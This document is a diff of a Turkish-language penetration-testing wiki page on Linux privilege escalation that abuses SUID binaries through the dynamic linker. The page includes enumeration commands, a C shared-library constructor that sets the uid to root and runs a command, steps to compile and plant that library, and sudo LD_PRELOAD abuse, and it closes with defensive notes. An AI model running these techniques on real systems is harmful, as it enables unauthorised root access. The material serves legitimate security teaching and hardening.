@@ -1,35 +1,37 @@
 # SUID Shared Library ve Linker Abuse
 
-SUID binary'leri genellikle doğrudan komut çalıştırma açısından incelenir, ancak özel SUID programları dynamic linker üzerinden de vulnerable olabilir. Yaygın tema basittir: ayrıcalıklı bir executable, daha düşük ayrıcalıklara sahip bir kullanıcının etkileyebileceği bir path veya configuration üzerinden code yükler.<sup>[[1]](#references)</sup>
+{{#include ../../banners/hacktricks-training.md}}
 
-Bu sayfa generic technique pattern'lerine odaklanır: eksik library'ler, writable library directory'leri, `RPATH`/`RUNPATH`, sudo üzerinden `LD_PRELOAD`, linker configuration ve SUID hardlink confusion.
+SUID binary'leri genellikle doğrudan komut çalıştırma açısından incelenir; ancak özel SUID programları dynamic linker üzerinden de zafiyetli olabilir. Yaygın tema basittir: ayrıcalıklı bir executable, daha düşük ayrıcalıklara sahip bir kullanıcının etkileyebileceği bir path veya configuration üzerinden code yükler.<sup>[[1]](#references)</sup>
 
-## Hızlı Enumeration
+Bu sayfa generic technique pattern'larına odaklanır: eksik library'ler, writable library directory'leri, `RPATH`/`RUNPATH`, sudo üzerinden `LD_PRELOAD`, linker configuration ve SUID hardlink confusion.
 
-Olağandışı SUID file'larını bulup bunların dynamic olarak linked olup olmadığını kontrol ederek başlayın:<sup>[[1]](#references)[[3]](#references)</sup>
+## Fast Enumeration
+
+Olağandışı SUID file'larını bularak ve bunların dynamic olarak linked olup olmadığını kontrol ederek başlayın:<sup>[[1]](#references)[[3]](#references)</sup>
 ```bash
 find / -perm -4000 -type f -ls 2>/dev/null
 file /path/to/suid-binary
 ldd /path/to/suid-binary 2>/dev/null
 readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
 ```
-Standart olmayan konumlara, özel uygulama yollarına, root tarafından sahip olunan ancak paket yöneticisi tarafından yönetilen dizinlerin dışında bulunan binary'lere ve yazılabilir dizinlerden yüklenen bağımlılıklara odaklanın.<sup>[[1]](#references)</sup>
+Standart olmayan konumlara, özel uygulama yollarına, paket yöneticisi tarafından yönetilen dizinlerin dışında bulunan ve root tarafından sahip olunan binary'lere ve yazılabilir dizinlerden yüklenen bağımlılıklara odaklanın.<sup>[[1]](#references)</sup>
 
-Yararlı yazılabilirlik kontrolleri:
+Faydalı yazılabilirlik kontrolleri:
 ```bash
 ldd /path/to/suid-binary 2>/dev/null
 readelf -d /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
 find / -writable -type d 2>/dev/null | head -n 50
 ```
-## Missing Shared Object Injection
+## Eksik Shared Object Injection
 
-Bazı özel SUID binary'leri mevcut olmayan bir shared object yüklemeye çalışır. Eksik yol attacker'ın kontrolündeki bir dizinin altındaysa binary, attacker tarafından sağlanan kodu effective user olarak yükleyebilir.<sup>[[1]](#references)</sup>
+Bazı özel SUID binary'leri mevcut olmayan bir shared object'i yüklemeye çalışır. Eksik yol saldırganın kontrolündeki bir dizinin altındaysa binary, saldırgan tarafından sağlanan kodu etkin kullanıcı olarak yükleyebilir.<sup>[[1]](#references)</sup>
 
-Başarısız library lookup işlemlerini `strace`'in syscall filtresiyle bulun:<sup>[[2]](#references)</sup>
+`strace`'in syscall filtresiyle başarısız library aramalarını bulun:<sup>[[2]](#references)</sup>
 ```bash
 strace -f -e trace=openat,access /path/to/suid-binary 2>&1 | grep -Ei 'ENOENT|\\.so'
 ```
-Binary, `libexample.so` için yazılabilir bir path arıyorsa, minimal bir proof library constructor kullanabilir. Validation sırasında proof-of-impact'i zararsız tutun:<sup>[[6]](#references)</sup>
+İkili, `libexample.so` için yazılabilir bir path arıyorsa minimal bir proof library constructor kullanabilir. Doğrulama sırasında proof-of-impact'i zararsız tutun:<sup>[[6]](#references)</sup>
 ```c
 #include <stdlib.h>
 #include <unistd.h>
@@ -41,29 +43,29 @@ setgid(0);
 system("id > /tmp/suid-so-ran");
 }
 ```
-Binary'nin yüklemeye çalıştığı tam dosya adıyla derleyin:
+Binary’nin yüklemeye çalıştığı tam dosya adıyla derleyin:
 ```bash
 gcc -shared -fPIC proof.c -o /writable/path/libexample.so
 /path/to/suid-binary
 cat /tmp/suid-so-ran
 ```
-Sömürülebilir koşul yalnızca kütüphanenin eksik olması değildir. Saldırgan, ayrıcalıklı loader'ın kabul edeceği bir yola uyumlu bir shared object yerleştirebilmelidir.<sup>[[1]](#references)</sup>
+İstismar edilebilir koşul yalnızca eksik library değildir. Saldırgan, ayrıcalıklı loader'ın kabul edeceği bir path'e uyumlu bir shared object yerleştirebilmelidir.<sup>[[1]](#references)</sup>
 
-## Yazılabilir Kütüphane Dizini
+## Writable Library Directory
 
-Bazen tüm bağımlılıklar mevcut olur, ancak bunları çözümlemek için kullanılan dizinlerden biri yazılabilirdir. Bu, yüklenmiş bir kütüphanenin değiştirilmesine veya aynı ada sahip daha yüksek öncelikli bir kütüphanenin yerleştirilmesine olanak sağlayabilir.<sup>[[1]](#references)</sup>
+Bazen tüm dependencies mevcuttur, ancak bunları çözümlemek için kullanılan directory'lerden biri writable durumdadır. Bu, yüklenmiş bir library'nin değiştirilmesine veya aynı ada sahip daha yüksek öncelikli bir library'nin yerleştirilmesine olanak tanıyabilir.<sup>[[1]](#references)</sup>
 
-Bağımlılık yollarını inceleyin:<sup>[[1]](#references)[[3]](#references)</sup>
+Dependency path'lerini inceleyin:<sup>[[1]](#references)[[3]](#references)</sup>
 ```bash
 ldd /path/to/suid-binary 2>/dev/null
 readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
 namei -om /path/to/library.so
 ```
-Dizin yazılabilir durumdaysa laboratuvar ortamında kopyalama açısından güvenli bir yaklaşımla doğrulayın. Canlı bir host üzerinde system library’lerini değiştirmek, aynı anda başlatılan process’leri library sürümleri arasında tutarsız bir durumda bırakabilir.<sup>[[8]](#references)</sup>
+Dizin yazılabilir durumdaysa, bunu bir lab ortamında kopya güvenli bir yaklaşımla doğrulayın. Canlı bir host üzerinde system libraries değiştirmek, aynı anda başlatılan process'lerin library sürümleriyle tutarsız kalmasına neden olabilir.<sup>[[8]](#references)</sup>
 
 ## RPATH and RUNPATH
 
-`RPATH` ve `RUNPATH`, loader’a library’leri nerede arayacağını bildiren dynamic-section girdileridir. Attacker tarafından yazılabilir dizinleri gösterdiklerinde SUID programlarında tehlikelidirler.<sup>[[1]](#references)</sup>
+`RPATH` ve `RUNPATH`, loader'a libraries için nerede arama yapacağını bildiren dynamic-section girdileridir. SUID programlarında attacker tarafından yazılabilir dizinleri gösterdiklerinde tehlikelidirler.<sup>[[1]](#references)</sup>
 
 Bunları tespit edin:<sup>[[3]](#references)[[10]](#references)</sup>
 ```bash
@@ -81,66 +83,66 @@ ls -ld /opt/app/lib
 gcc -shared -fPIC proof.c -o /opt/app/lib/libcustom.so
 /path/to/suid-binary
 ```
-`RPATH` ve `RUNPATH` tüm çözümleme ayrıntılarında aynı değildir; ancak privilege-escalation incelemesi açısından pratik soru aynıdır: SUID binary, bir library name için attacker-writable bir directory arıyor mu?<sup>[[1]](#references)</sup>
+`RPATH` ve `RUNPATH` tüm çözümleme ayrıntılarında aynı değildir; ancak privilege-escalation incelemesi için pratik soru aynıdır: SUID binary, bir library name için attacker-writable bir directory arıyor mu?<sup>[[1]](#references)</sup>
 
 ## LD_PRELOAD, LD_LIBRARY_PATH ve SUID
 
-Normal programlarda `LD_PRELOAD` ve `LD_LIBRARY_PATH`, shared object yüklemesini zorlayabilir veya etkileyebilir. SUID programlarında dynamic loader normalde secure-execution mode'a geçer ve tehlikeli environment variable'ları yok sayar.<sup>[[1]](#references)</sup>
+Normal programlarda `LD_PRELOAD` ve `LD_LIBRARY_PATH`, shared object yüklemesini zorlayabilir veya etkileyebilir. SUID programlarında dynamic loader normalde secure-execution mode'a girer ve tehlikeli environment variable'ları yok sayar.<sup>[[1]](#references)</sup>
 
-Bu, kullanıcının `LD_PRELOAD` ayarlayabilmesi nedeniyle düz bir SUID binary'nin genellikle vulnerable olmadığı anlamına gelir:<sup>[[1]](#references)</sup>
+Bu, kullanıcının `LD_PRELOAD` ayarlayabilmesi nedeniyle sıradan bir SUID binary'nin genellikle vulnerable olmadığı anlamına gelir:<sup>[[1]](#references)</sup>
 ```bash
 LD_PRELOAD=/tmp/proof.so /path/to/suid-binary
 ```
-Yaygın istisna, hedef komut için loader değişkenlerinin ayarlanmasına veya korunmasına izin veren bir sudo policy'dir. `sudo -l` çıktısında `env_keep+=LD_PRELOAD` veya `env_keep+=LD_LIBRARY_PATH` gibi girdileri inceleyin; hedef dynamically linked ise attacker-controlled code yükleyebilir:<sup>[[4]](#references)[[5]](#references)</sup>
+Yaygın istisna, hedef komut için loader değişkenlerinin ayarlanmasına veya korunmasına izin veren bir sudo policy'sidir. `sudo -l` çıktısında `env_keep+=LD_PRELOAD` veya `env_keep+=LD_LIBRARY_PATH` gibi girdileri inceleyin; hedef dynamically linked ise attacker-controlled code yükleyebilir:<sup>[[4]](#references)[[5]](#references)</sup>
 ```bash
 sudo -l
 # Look for env_keep+=LD_PRELOAD or env_keep+=LD_LIBRARY_PATH
 sudo LD_PRELOAD=/tmp/proof.so /allowed/command
 ```
-Bu durumları karıştırmayın; loader ve sudo policy kuralları bunları birbirinden ayırır:<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>
+Bu durumları birbiriyle karıştırmayın; yukarıdaki loader ve sudo policy kuralları bunları birbirinden ayırır:<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>
 
 - Normal bir SUID binary'ye karşı `LD_PRELOAD`: genellikle secure execution tarafından engellenir.
-- sudo tarafından korunan `LD_PRELOAD`: potansiyel olarak exploitable.
-- Writable bir path'te eksik `.so`: SUID binary bu path'i doğal olarak yüklediğinde exploitable.
-- Writable bir directory'ye yönlendiren `RPATH`/`RUNPATH`: gerekli bir library kontrol edilebildiğinde exploitable.
-- `/etc/ld.so.preload` veya linker config için write access: sistem genelini etkiler ve yüksek etkiye sahiptir.
+- sudo tarafından korunan `LD_PRELOAD`: potansiyel olarak exploit edilebilir.
+- Yazılabilir bir path'te eksik `.so`: SUID binary bu path'i doğal olarak yüklediğinde exploit edilebilir.
+- Yazılabilir bir directory'ye işaret eden `RPATH`/`RUNPATH`: ihtiyaç duyulan bir library kontrol edilebildiğinde exploit edilebilir.
+- `/etc/ld.so.preload` veya linker config yazma erişimi: system-wide ve yüksek etkilidir.
 
 ## Linker Configuration
 
-`ld.so`, linker cache ve `/etc/ld.so.preload` kullanır; `ldconfig` bu cache'i `/etc/ld.so.conf` ve buradan include edilen dosyalardan, genellikle `/etc/ld.so.conf.d/` içinden oluşturur.<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>
+`ld.so`, linker cache'i ve `/etc/ld.so.preload` dosyasını kullanır; `ldconfig` bu cache'i `/etc/ld.so.conf` ve genellikle `/etc/ld.so.conf.d/` içinden dahil edilen dosyalardan oluşturur.<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>
 
-Öncelikli kontroller:
+Yüksek değerli kontroller:
 ```bash
 ls -l /etc/ld.so.preload /etc/ld.so.conf 2>/dev/null
 find /etc/ld.so.conf.d -type f -writable -ls 2>/dev/null
 find /etc/ld.so.conf.d -type d -writable -ls 2>/dev/null
 ldconfig -v 2>/dev/null | head -n 50
 ```
-Writable linker configuration is usually more serious than a single vulnerable SUID binary because it can affect many dynamically linked processes. `/etc/ld.so.preload` is especially dangerous because it can force a shared object into privileged processes.<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>
+Writable linker configuration, tek bir vulnerable SUID binary'den genellikle daha ciddidir; çünkü birçok dynamically linked process'i etkileyebilir. `/etc/ld.so.preload` özellikle tehlikelidir; privileged process'lere bir shared object'i zorla yükleyebilir.<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>
 
 ## SUID Hardlink Confusion
 
-Hardlink'ler aynı SUID inode'unun birden fazla ad altında görünmesini sağlayabilir.<sup>[[9]](#references)</sup> Bu, ayrıcalıklı bir helper'ı gizlemek, cleanup işlemlerini karıştırmak veya naif path tabanlı incelemeyi atlatmak için kullanılabilir.
+Hardlink'ler, aynı SUID inode'un birden fazla isim altında görünmesini sağlayabilir.<sup>[[9]](#references)</sup> Bu, privileged bir helper'ı gizlemek, cleanup işlemlerini karıştırmak veya naif path tabanlı incelemeyi atlatmak için kullanılabilir.
 
 Birden fazla link'i olan SUID dosyalarını bulun:<sup>[[9]](#references)</sup>
 ```bash
 find / -xdev -perm -4000 -type f -links +1 -ls 2>/dev/null
 ```
-Aynı inode’a sahip tüm yolları inceleyin:<sup>[[9]](#references)</sup>
+Aynı inode'a giden tüm yolları inceleyin:<sup>[[9]](#references)</sup>
 ```bash
 stat /path/to/suid-wrapper
 find / -xdev -samefile /path/to/suid-wrapper -ls 2>/dev/null
 ```
-Abuse, bir hardlink'in izinleri değiştirmesi değildir. Abuse, path confusion'dır: ayrıcalıklı bir inode, defenders veya script'lerin beklemediği bir ad üzerinden erişilebilir olabilir.<sup>[[9]](#references)</sup> Daha ayrıntılı inode ve hardlink workflow'u için [Filesystem, Inodes and Recovery](../main-system-information/filesystem-inodes-and-recovery.md) sayfasına bakın.
+Abuse, bir hardlink'in izinleri değiştirmesi değildir. Abuse, ayrıcalıklı bir inode'a savunucuların veya script'lerin beklemediği bir ad üzerinden erişilebilmesidir.<sup>[[9]](#references)</sup> Daha ayrıntılı inode ve hardlink iş akışı için [Filesystem, Inodes and Recovery](../main-system-information/filesystem-inodes-and-recovery.md) bölümüne bakın.
 
-## Savunma Notları
+## Defensive Notes
 
 - SUID binary'lerini mümkün olduğunca minimal, denetlenmiş ve package-managed tutun.
-- Writable veya application-managed dizinleri gösteren `RPATH`/`RUNPATH` girdilerinden kaçının.<sup>[[1]](#references)[[8]](#references)</sup>
-- Library dizinlerini root-owned ve regular user'lar tarafından writable olmayacak şekilde tutun.<sup>[[8]](#references)</sup>
-- `LD_PRELOAD`, `LD_LIBRARY_PATH` veya benzer loader variable'larını sudo üzerinden korumayın.<sup>[[1]](#references)[[5]](#references)</sup>
-- `/etc/ld.so.preload`, `/etc/ld.so.conf`, `/etc/ld.so.conf.d/` ve beklenmeyen SUID file'larını monitor edin.<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>
-- Hardlinked SUID file'larını review edin ve standard system path'lerinin dışındaki custom SUID wrapper'larını investigate edin.<sup>[[9]](#references)</sup>
+- Yazılabilir veya application-managed dizinleri gösteren `RPATH`/`RUNPATH` girişlerinden kaçının.<sup>[[1]](#references)[[8]](#references)</sup>
+- Library dizinlerinin root-owned olmasını ve normal kullanıcılar tarafından yazılamamasını sağlayın.<sup>[[8]](#references)</sup>
+- `LD_PRELOAD`, `LD_LIBRARY_PATH` veya benzer loader variable'larının sudo üzerinden korunmasına izin vermeyin.<sup>[[1]](#references)[[5]](#references)</sup>
+- `/etc/ld.so.preload`, `/etc/ld.so.conf`, `/etc/ld.so.conf.d/` ve beklenmeyen SUID dosyalarını izleyin.<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>
+- Hardlink'lenmiş SUID dosyalarını inceleyin ve standart system path'lerinin dışındaki özel SUID wrapper'larını araştırın.<sup>[[9]](#references)</sup>
 
 ## References
 
